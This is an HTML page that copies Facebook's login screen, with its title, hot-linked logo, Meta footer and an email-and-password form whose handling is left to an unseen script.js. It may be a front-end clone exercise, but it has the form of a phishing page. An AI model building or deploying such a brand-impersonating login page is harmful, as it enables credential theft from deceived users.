<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – Log In or Sign Up</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="main-container">
        <section class="branding">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu_m_aGDR.svg" alt="Facebook" class="logo">
            <h1 class="headline">Explore the things <span>you love.</span></h1>
        </section>

        <section class="login-container">
            <div class="login-card">
                <form id="loginForm">
                    <h2>Log in to Facebook</h2>
                    <input type="text" id="email" placeholder="Email address or mobile number" required>
                    <input type="password" id="pass" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                
                <div class="footer-links">
                    <a href="#">Forgotten password?</a>
                    <hr>
                    <button class="create-account-btn">Create new account</button>
                </div>
            </div>
            <p class="meta-footer"><strong>Meta</strong></p>
        </section>
    </div>

    <script src="script.js"></script>
</body>
</html>
